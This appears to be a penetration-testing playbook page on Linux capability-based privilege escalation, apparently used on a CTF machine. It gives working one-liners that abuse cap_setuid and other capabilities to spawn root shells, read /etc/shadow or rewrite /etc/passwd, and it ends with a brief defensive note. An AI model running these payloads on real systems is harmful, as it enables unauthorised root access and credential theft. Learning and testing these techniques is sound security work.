# Linux Capabilities Privesc

Used on: **ohmyweb**

POSIX capabilities are the per-binary fine-grained replacement for SUID. A binary with the right `+ep` capability bits behaves as if it were SUID **only for that subset of root powers** — but in practice "the right subset" is often a one-line jump to a root shell.

The dangerous one is `cap_setuid+ep` on any scripting interpreter: Python, Perl, Ruby, Node, even `awk` in some distros. Once you can `setuid(0)` from a high-level language, exec a shell and you're root.

## Prerequisites
- A foothold as any user.
- `getcap` available (any modern distro). If it isn't, scp it in or read the xattr directly with `getfattr -n security.capability <bin>`.
- A binary on disk with a useful capability set.

## How It Works

The kernel checks file capabilities on `execve`. If the binary has `cap_setuid` in both the **permitted** (p) and **effective** (e) sets, it can call `setuid()` and lose nothing -- the kernel raises EUID instantly. The interpreter then executes anything you give it as that uid.

`+ep` (effective + permitted) is the dangerous combo. `+i` (inheritable) alone is mostly noise.

## Steps

### 1. Sweep the filesystem
```bash
getcap -r / 2>/dev/null
```
Used on: **ohmyweb**

What you're looking for:
```
/usr/bin/python3.7 = cap_setuid+ep
```

### 2. Pop a root shell

Python, single line, works on any version with `cap_setuid+ep`:
```bash
/usr/bin/python3.7 -c 'import os; os.setuid(0); import pty; pty.spawn("/bin/bash")'
```
Used on: **ohmyweb**

`pty.spawn` rather than spawning a shell via `subprocess` because:
- You get a TTY immediately (no `python -c 'pty'` second step).
- A shell launched via `subprocess` invokes `sh -c <arg>` and bash drops privileges when EUID != UID without `-p`. `pty.spawn("/bin/bash")` does not.

If `pty` is unavailable, the equivalent that survives almost any environment uses `os.execl` to keep EUID=0:
```bash
/usr/bin/python3.7 -c 'import os; os.setuid(0); os.execl("/bin/bash","bash","-p")'
```
The `-p` keeps EUID=0; without it bash silently resets EUID to UID and you're stuck back at the original user.

## Variants -- one-liners by interpreter

| Capability on | Payload |
|---------------|---------|
| `python` / `python3` | `python -c 'import os; os.setuid(0); os.execl("/bin/bash","bash","-p")'` |
| `perl` | `perl -e 'use POSIX; POSIX::setuid 0; exec "/bin/bash","-p"'` |
| `ruby` | `ruby -e 'Process::Sys.setuid 0; exec "/bin/bash","-p"'` |
| `node` | `node -e 'process.setuid(0); require("child_process").spawn("/bin/bash",["-p"],{stdio:[0,1,2]})'` |
| `awk` (`mawk`/`gawk`) | rare, but `cap_dac_read_search+ep` lets you read any file with `awk 'NR<=10' /etc/shadow` |

## Other capabilities worth recognising

| Cap | Why it's lethal | Quick payload |
|-----|-----------------|---------------|
| `cap_dac_read_search+ep` | bypass file read perms | `tar cf - /etc/shadow` then `cat shadow.tar` |
| `cap_dac_override+ep` | bypass read **and write** | overwrite `/etc/passwd` to add a uid-0 user |
| `cap_sys_admin+ep` | "second root" | `mount` your way out of a chroot, or `unshare` a new namespace |
| `cap_sys_ptrace+ep` | `ptrace` any process incl. root | inject shellcode into a root-owned PID with `gdb -p` |
| `cap_chown+ep` | own any file | `chown $(whoami) /etc/shadow`, then read |
| `cap_net_raw+ep` | raw sockets | not privesc, but lets you sniff inside a container |
| `cap_sys_module+ep` | `init_module` | load a kernel module, game over |

## How to Find It

- `getcap -r / 2>/dev/null` -- always run this in your post-foothold sweep ([linux-enumeration.md](../enumeration/linux-enumeration.md)).
- Containers often ship with surprising capabilities -- vendors carry over their dev defaults.
- `find / -type f -newer /etc/passwd -executable 2>/dev/null` plus `getcap` on each finds custom-installed interpreters with caps.

## Defensive Note

- Don't add `cap_setuid` to general-purpose interpreters. If you really need it on Python, install a wrapper binary that drops to a fixed uid and execs the script -- not the interpreter itself.
- `setcap -r <bin>` removes capabilities; check with `getcap` before assuming the rollback worked.

## Related
- [getcap](../../tools/container/getcap.md) -- the discovery tool
- [linux-enumeration.md](../enumeration/linux-enumeration.md) -- where capabilities live in the playbook
- GTFOBins capabilities index: <https://gtfobins.org/#+capabilities>


